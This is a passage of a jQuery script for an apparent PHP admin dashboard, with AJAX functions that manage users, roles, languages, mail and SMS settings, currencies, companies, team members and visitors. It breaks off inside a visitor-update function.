$(document).ready(function () {
    
    "use strict";
//        ========== its start for when submit to save use php then auto click the ===============
        var uri = $("#uri").val();
        if (uri == 21) {
            $("#v-pills-userlist-tab").trigger("click");
        }
        if (uri == 1) {
            $("#v-pills-rolepermission-tab").trigger("click");
        }
        if (uri == 2) {
            $("#v-pills-applicationlist-tab").trigger("click");
        }
        if (uri == 31) {
            $("#v-pills-rolelist-tab").trigger("click");
        }
        if (uri == 3) {
            $("#v-pills-assignuserrole-tab").trigger("click");
        }
        if (uri == 4) {
            $("#v-pills-assignuserrolelist-tab").trigger("click");
        }
        if (uri == 5) {
            $("#v-pills-addphrase-tab").trigger("click");
        }
        if (uri == 6) {
            $("#v-pills-addlanguage-tab").trigger("click");
        }
        if (uri == 7) {
            $("#v-pills-mailconfigs-tab").trigger("click");
        }
        if (uri == 9) {
            $("#v-pills-smsconfigs-tab").trigger("click");
        }
        if (uri == 10|uri == 11) {
            $("#v-pills-smstemplate-tab").trigger("click");
        }
        if (uri == 13) {
            $("#v-pills-menusetting-tab").trigger("click");
        }
        if (uri == 16 | uri == 15 | uri == 18) {
            $("#v-pills-currencylist-tab").trigger("click");
        }
        if (uri == 17) {
            $("#v-pills-commonlist-tab").trigger("click");
        }
//        ============= its close auto click the tab =============
        $('.btnNext').on('click', function () {
            $('.nav-pills .active').parent().next('li').find('a').trigger('click');
        });

        $('.btnPrevious').on('click', function () {
            $('.nav-pills .active').parent().prev('li').find('a').trigger('click');
        });



    });

"use strict";
function toastrErrorMsg(r) {
    setTimeout(function () {
        toastr.options = {
            closeButton: true,
            progressBar: true,
            showMethod: 'slideDown',
            timeOut: 1500,
        };
        toastr.error(r);
    }, 1000);
}
// //            ========= its for toastr error message =============
"use strict";
function toastrSuccessMsg(r) {
    setTimeout(function () {
        toastr.options = {
            closeButton: true,
            progressBar: true,
            showMethod: 'slideDown',
            timeOut: 1500,
        };
        toastr.success(r);
    }, 1000);
}

//=============== its for user_save ===========
"use strict";
function user_save() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var firstname = $("#firstname").val();
    var lastname = $("#lastname").val();
    var email = $("#email").val();
    var password = $("#password").val();
    var file = $('#image').val().split('.').pop().toLowerCase();
    var status = $('.status:checked').val();
    if (firstname == '') {
        $("#firstname").focus();
        toastrErrorMsg("First name must be required");
        setTimeout(function () {
        }, 500);
        return false;
    }
    if (lastname == '') {
        $("#lastname").focus();
        toastrErrorMsg("Last name must be required");
        setTimeout(function () {
        }, 500);
        return false;
    }
    if (email == '') {
        $("#email").focus();
        toastrErrorMsg("Email must be required");
        setTimeout(function () {
        }, 500);
        return false;
    }
    if (password == '') {
        $("#password").focus();
        toastrErrorMsg("Password must be required");
        setTimeout(function () {
        }, 500);
        return false;
    }
    if($.inArray(file, ['gif','png','jpg','jpeg']) == -1) {
        toastrErrorMsg("Image is Required or Invalid");
        return false;
    }
    if (IsEmail(email) == false) {
        toastrErrorMsg("Invalid mail");
        return false;
    }
    fd.append('image', $('#image')[0].files[0]);
    fd.append('firstname', $('#firstname').val());
    fd.append('lastname', $('#lastname').val());
    fd.append('email', $('#email').val());
    fd.append('password', $('#password').val());
    fd.append('about', $('#about').val());
    fd.append('status', status);
    fd.append('csrf_test_name', CSRF_TOKEN);

    $.ajax({
        url: base_url + "add-user",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            $('#firstname').val('');
            $('#lastname').val('');
            $('#email').val('');
            $('#password').val('');
            $('#about').val('');
            toastr.success("<h5>Success</h5>Save Successfully");         
            if(r.substr(4,1)==="F")
            toastrErrorMsg(r);
                window.location.reload();
        }
    });
}


//=========== its for valid mail check ===============
"use strict";
function IsEmail(email) {
    var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!regex.test(email)) {
        return false;
    } else {
        return true;
    }
}

//    ============== its for getuserlist =============
"use strict";
function getuserlist() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "user-list",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".userlistshow").html(r);
        }
    });
}

//    ============= add user edit form ============
"use strict";
function get_useredit(user_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "useredit-form",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, user_id: user_id},
        success: function (r) {
            $(".modal_ttl").html("User Information");
            $("#info").html(r);
            $("#modal_info").modal('show');
        }
    });
}

//    =========== its for user info update ============
"use strict";
function update_userinfo() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var base_url = $("#base_url").val();
    var edit_firstname = $('#edit_firstname').val();
    var edit_lastname = $('#edit_lastname').val();
    var edit_email = $('#edit_email').val();

    if (edit_firstname == '') {
        $("#edit_firstname").focus();
        toastrErrorMsg("First name must be required");
        return false;
    }
    if (edit_lastname == '') {
        $("#edit_lastname").focus();
        toastrErrorMsg("Last name must be required");
        return false;
    }
    if (edit_email == '') {
        $("#edit_email").focus();
        toastrErrorMsg("Email must be required");
        return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    fd.append('hdn_image', $('#hdn_image').val());
    fd.append('image', $('#edit_image')[0].files[0]);
    fd.append('firstname', $('#edit_firstname').val());
    fd.append('lastname', $('#edit_lastname').val());
    fd.append('email', $('#edit_email').val());
    fd.append('oldpass', $('#oldpass').val());
    fd.append('password', $('#edit_password').val());
    fd.append('about', $('#edit_about').val());
    fd.append('user_id', $('#user_id').val());
    fd.append('csrf_test_name', CSRF_TOKEN);

    $.ajax({
        url: base_url + "user-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            getuserlist();
            $('#modal_info').modal('hide');
        }
    });
}
//============ its for userdelete =============
"use strict";
function userdelete(user_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "delete-user/"+user_id,
            type: "post",
            data: {'csrf_test_name': CSRF_TOKEN, user_id: user_id},
            success: function (r) {
                toastr.success("<h5>Success</h5>User Deleted");
                getuserlist();
            }
        });
    }
}

//    ============== its for getrolepermission_form =============
"use strict";
function getrolepermission_form() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "get-rolepermissionform",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".rolepermissionfrm_show").html(r);
        }
    });
}
//    ============== its for getrolepermission_form =============
"use strict";
function getrolepermission_list() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "assign-role-list",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".rolepermissionlist_show").html(r);
        }
    });
}

//============ its for role delete =============
"use strict";
function roledelete(menu_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "delete-role-assign/"+menu_id,
            type: "post",
            data: {'csrf_test_name': CSRF_TOKEN, menu_id: menu_id},
            success: function (r) {
                toastrSuccessMsg("<h5>Success</h5>Role Deleted");
                getrolepermission_list();
            }
        });
    }
}

//============= its for user role check==============
"use strict";
function userRole(id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "user-role-check",
        type: 'post',
        data: {'csrf_test_name': CSRF_TOKEN, user_id: id},
        success: function (r) {
            $(".existrole_ttl").html("Assigned Role");
            r = JSON.parse(r);
            $("#existrole ul").empty();
            $.each(r, function (ar, typeval) {
                if (typeval.role_name == 'Not Found') {
                    $("#existrole ul").html("<span class='text-danger'>Not Found</span>");
                    $("#exitrole ul").css({'color': 'red'});
                } else {
                    $("#existrole ul").append('<li>' + typeval.role_name + '</li>');
                }
            });
        }
    });
}
//    ============== its for get assign user role =============
"use strict";
function getassignuserrole() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "assignn-role-to-user",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".assignuserrole_show").html(r);
        }
    });
}
//    ============== its for get assign user role =============
"use strict";
function getassignuserrolelist() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "user-access",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".assignuserrolelist_show").html(r);
        }
    });
}
//============ its for user assign role edit ===============
"use strict";
function useraccessrole(user_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "edit-role/"+user_id,
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, user_id: user_id},
        success: function (r) {
            $(".assignuserrolelist_show").html(r);
        }
    });
}
//    ============== its for menudelete ==========
"use strict";
function roleassigndelete(user_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "delete-role/"+user_id,
            type: "POST",
            data: {'csrf_test_name': CSRF_TOKEN, user_id: user_id},
            success: function (r) {
                toastrSuccessMsg("<h5>Success</h5>User Access Deleted");
                getassignuserrolelist();
            }
        });
    }
}
//    ============== its for get language add and list =============
"use strict";
function getlanguage() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "language",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".addlanguage_show").html(r);
        }
    });
}
//    ============= its for save language ==========
"use strict";
function save_language() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var language = $("#language").val();
    if (language == '') {
        $("#language").focus();
        toastrErrorMsg("Empty field not allow");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "language-save",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, language: language},
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#language").val('');
            getlanguage();
        }
    });
}
//    ============== its for get phrase add and list =============
"use strict";
function getphrase() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "phrase-list",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".addphrase_show").html(r);
        }
    });
}
//    ============= its for save_phrase ==========
"use strict";
function save_phrase() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var phrase = $("#phrase").val();
    if (phrase == '') {
        $("#phrase").focus();
        toastrErrorMsg("Empty field not allow");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "phrase-save",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, phrase: phrase},
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#phrase").val('');
            table.ajax.reload();
        }
    });
}
//=============== its for phraselabel =============
"use strict";
function phraselabel(phrase) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "phrase-label-search",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, phrase: phrase},
        success: function (r) {
            $(".results").html(r);
        },
    });
}

//    ============= its for getmailconfig ==============
"use strict";
function getmailconfig() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "email-setting",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".mailconfigs_show").html(r);
        }
    });
}
//    ================ its for mailconfig_save ==========
"use strict";
function mailconfig_save() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var protocol = $("#protocol").val();
    var smtp_host = $("#smtp_host").val();
    var smtp_port = $("#smtp_port").val();
    var smtp_user = $("#smtp_user").val();
    var smtp_pass = $("#smtp_pass").val();
    var mailtype = $("#mailtype").val();
    var isinvoice = $('.isinvoice:checked').val();
    var isreceive = $('.isreceive:checked').val();

    if (protocol == '') {
        $("#protocol").focus();
        toastrErrorMsg("Protocol must be required");
        return false;
    }
    if (smtp_host == '') {
        $("#smtp_host").focus();
        toastrErrorMsg("SMTP HOST must be required");
        return false;
    }
    if (smtp_port == '') {
        $("#smtp_port").focus();
        toastrErrorMsg("SMTP Port must be required");
        return false;
    }
    if (smtp_user == '') {
        $("#smtp_user").focus();
        toastrErrorMsg("Username must be required");
        return false;
    }
    if (smtp_pass == '') {
        $("#smtp_pass").focus();
        toastrErrorMsg("Password must be required");
        return false;
    }
    if (mailtype == '') {
        $("#mailtype").focus();
        toastrErrorMsg("Mailtype must be required");
        return false;
    }
    $.ajax({
        url: base_url + "mailconfig-update",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, protocol: protocol, smtp_host: smtp_host, smtp_port: smtp_port, smtp_user: smtp_user, smtp_pass: smtp_pass, mailtype: mailtype, isinvoice: isinvoice, isreceive: isreceive},
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
        }
    });
}
//    ============= its for getsmsconfig ==============
"use strict";
function getsmsconfig() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "sms-configuration",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".smsconfig_show").html(r);
        }
    });
}
//    ============= its for getsmsconfig ==============
"use strict";
function getsmstemplate() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "sms-template",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".smstemplate_show").html(r);
        }
    });
}

"use strict";
function smstemplatedelete(id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "dashboard/smsetting/delete_teamplate/"+id,
            type: "post",
            data: {'csrf_test_name': CSRF_TOKEN, id: id},
            success: function (r) {
                toastr.success("<h5>Success</h5>Template Deleted");
                getsmstemplate();
            }
        });
    }
}
//    ================ its for smsconfig_save ==============
"use strict";
function smsconfig_save() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var provider_name = $("#provider_name").val();
    var user_name = $("#user_name").val();
    var password = $("#sms_password").val();
    var phone = $("#phone").val();
    var sender_name = $("#sender_name").val();
    var isinvoice = $(".isinvoice3:checked").val();
    var isreceive = $(".isreceive3:checked").val();

    if (user_name == '') {
        $("#user_name").focus();
        toastrErrorMsg("Username must be required");
        return false;
    }
    if (password == '') {
        $("#password").focus();
        toastrErrorMsg("Password must be required");
        return false;
    }

    $.ajax({
        url: base_url + "smsconfig-save",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, provider_name: provider_name, user_name: user_name, password: password, phone: phone, sender_name: sender_name, isinvoice: isinvoice, isreceive: isreceive},
        success: function (r) {
            toastr.success(r);
        }
    });
}



//    ============= its for getsubscriberlist ==============
"use strict";
function getsubscriberlist() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "subscribe-list",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".subscriberlist_show").html(r);
        }
    });
}
//    ============= its for getsubscriberlist ==============
"use strict";
function getmenusetting() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "menu-setting",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".menusetting_show").html(r);
        }
    });
}
//    ============= its for getcurrencylist ==============
"use strict";
function getcurrencylist() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "currency-setting",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".currencylist_show").html(r);
        }
    });
}
function currencydelete(id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "dashboard/web_setting/deletecurrency/"+id,
            type: "post",
            data: {'csrf_test_name': CSRF_TOKEN, id: id},
            success: function (r) {
                toastr.success("<h5>Success</h5>Currency Deleted");
                getcurrencylist();
            }
        });
    }
}
//    ============= its for getcommonlist ==============
"use strict";
function getcommonlist() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "common-setting",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".commonlist_show").html(r);
        }
    });
}
//    ============= its for getapplicationlist ==============
"use strict";
function getapplicationlist() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "application-setting",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".applicationlist_show").html(r);
            $(".basic-single").select2();
        }
    });
}
//    ============= its for getcompanies ==============
"use strict";
function getcompanies() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "companies",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".companies_show").html(r);
        }
    });
}

//    ================== its for company edit ===========
"use strict";
function company_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "company-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Company Information");
            $("#company").html(r);
            $("#company_info").modal('show');
        }
    });
}
function companies_title_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "company-title-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Team Information");
            $("#company").html(r);
            $("#company_info").modal('show');
        }
    });
}
"use strict";
function companies_title_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#company_c_name").val();
    var designation = $("#company_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#company_c_name').val());
    fd.append('designation', $('#company_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#company_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#company_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "companies-title-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#c_name").val('');
            $("#company").modal('hide');
            $("#company_info").modal('hide');
            getcompanies();
        }
    });
}
//========== its for company info update =============
"use strict";
function company_infoupdate(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#company_width").val();
    var height = $("#company_height").val();
    var picture = $("#company_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('width', width);
    fd.append('height', height);
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#company_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#company_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "company-infoupdate",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#company").modal('hide');
            $("#company_info").modal('hide');
            getcompanies();
        }
    });
}

//    =========== its for getteammembers ==============
"use strict";
function getteammembers() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "team-members",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".teammembers_show").html(r);
        }
    });
}


//    ================== its for teammember edit ===========
"use strict";
function teammember_edit(teammember_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "teammember-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, teammember_id: teammember_id},
        success: function (r) {
            $(".modal_ttl").html("Team Information");
            $("#team").html(r);
            $("#team_info").modal('show');
        }
    });
}
"use strict";
function team_edit(teammember_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "team-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, teammember_id: teammember_id},
        success: function (r) {
            $(".modal_ttl").html("Team Information");
            $("#team").html(r);
            $("#team_info").modal('show');
        }
    });
}

//========== its for team member info update =============
"use strict";
function teammemberinfo_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#team_c_name").val();
    var designation = $("#team_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#team_c_name').val());
    fd.append('designation', $('#team_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#team_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#team_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "teammember-infoupdate",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#team_info").modal('hide');
            $("#team").modal('hide');
            getteammembers();
        }
    });
}
"use strict";
function team_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#team_width").val();
    var height = $("#team_height").val();
    var title = $("#team_title").val();
    var subtitle = $("#team_subtitle").val();
    var picture = $("#team_picture")[0].files[0];
    var link1 = $("#link1").val();
    var link2 = $("#link2").val();
    var link3 = $("#link3").val();
    var url = $("#url").val();
    var status = $("#status1").val();
    var base_url = $("#base_url").val();
    fd.append('width', width);
    fd.append('height', height);
    fd.append('title', title);
    fd.append('subtitle', subtitle);
    fd.append('picture', picture);
    fd.append('link1', link1);
    fd.append('link2', link2);
    fd.append('link3', link3);
    fd.append('url', url);
    fd.append('status', status);
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (title == '') {
        $("#team_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (subtitle == '') {
        $("#subtitle").focus();
        toastrErrorMsg("Subtitle must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (link1 == '') {
        $("#link1").focus();
        toastrErrorMsg("Link must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (link2 == '') {
        $("#link2").focus();
        toastrErrorMsg("Link must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (link3 == '') {
        $("#link3").focus();
        toastrErrorMsg("Link must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (url == '') {
        $("#url").focus();
        toastrErrorMsg("URL must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (status == '') {
        $("#status").focus();
        toastrErrorMsg("Status must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "team-infoupdate",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#title").val('');
            $("#team_info").modal('hide');
            $("#team").modal('hide');
            getteammembers();
        }
    });
}

//    ============= its for visitor form ==============
"use strict";
function getvisitors() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "visitor",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".visitor_show").html(r);
        }
    });
}
"use strict";
function visitors_edit(v_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "visitors-edit/"+v_id,
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, v_id: v_id},
        success: function (r) {
            $(".modal_ttl").html("Visitor Information");
            $("#visitor").html(r);
            $("#visitor_info").modal('show');
        }
    });
}
"use strict";
function visitors_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
